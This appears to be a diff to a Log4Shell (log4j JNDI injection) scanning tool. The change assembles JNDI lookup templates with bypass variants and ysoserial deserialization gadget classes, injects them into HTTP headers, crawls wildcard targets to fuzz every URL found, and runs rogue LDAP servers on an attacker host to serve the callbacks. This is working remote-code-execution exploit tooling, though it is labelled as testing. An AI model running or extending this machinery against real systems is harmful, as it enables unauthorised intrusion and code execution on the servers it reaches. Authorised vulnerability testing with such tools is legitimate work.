@@ -7,6 +7,7 @@ from bs4 import BeautifulSoup
 from pyasn1.codec.ber.decoder import decode as ber_decode
 from pyasn1.codec.ber.encoder import encode as ber_encode
 from pyasn1.error import PyAsn1Error
+from digslash import sites
 
 from LDAP import LDAPMessage
 from horrors import (
@@ -162,14 +163,19 @@ class SendRequests(scenarios.Scene):
                     for bypass_id, bypass in enumerate(config.BYPASSES):
                         if ldap_type == 'serialized':
                             for cls in YsoserialPayload.PAYLOAD_CLASSES:
-                                template = Template('${' + bypass + '/' + ldap_type + '/' + cls + '/' + str(bypass_id) + '/' + header + '}').substitute(LDAP_PORT=port, **self.context)
-                                headers = {header: template}
-                                for target in config.TARGETS:
-                                    self.queue.add(FuzzUri, target, headers, template)
+                                query = [bypass, ldap_type, cls, str(bypass_id), header]
                         else:
-                            template = Template('${' + bypass + '/' + ldap_type + '/' + str(bypass_id) + '/' + header + '}').substitute(LDAP_PORT=port, **self.context)
-                            headers = {header: template}
-                            for target in config.TARGETS:
+                            query = [bypass, ldap_type, str(bypass_id), header]
+                        template = Template('${' + '/'.join(query) + '}').substitute(LDAP_PORT=port, **self.context)
+                        logging.debug('Using template: ' + template)
+                        headers = {header: template}
+                        for target in config.TARGETS:
+                            if target.endswith('*'):
+                                site = sites.Site(target)
+                                await site.crawl()
+                                for url in site.results.keys():
+                                    self.queue.add(FuzzUri, url, headers, template)
+                            else:
                                 self.queue.add(FuzzUri, target, headers, template)
 
 
@@ -204,7 +210,6 @@ if __name__ == '__main__':
     httpd.add_event('run', when=events.PathContains('send-requests'))
 
     story = scenarios.Scenario(context=context, http_headers={'User-Agent': 'Automated log4j testing'}, debug=True)
-    # story = scenarios.Scenario(context=context, http_proxy='http://127.0.0.1:8088')
     story.add_service(httpd)
     for port in config.LDAP_PORTS:
         story.add_service(LDAP(address=context['ATTACKER_HOST'], port=port, context=context))
